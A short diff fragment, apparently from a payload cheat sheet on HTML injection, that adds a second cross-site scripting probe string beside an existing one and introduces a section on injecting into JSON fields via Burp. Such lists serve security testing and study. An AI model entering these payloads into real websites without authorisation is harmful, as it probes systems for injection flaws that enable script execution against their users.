@@ -6,6 +6,8 @@ HTML Innjection:
 
 "><img src=x onerror=alert(1)>
 
+"><<img onerror=alert(document.domain) src>
+
 
 In json fields through burp:
 -----------------------------
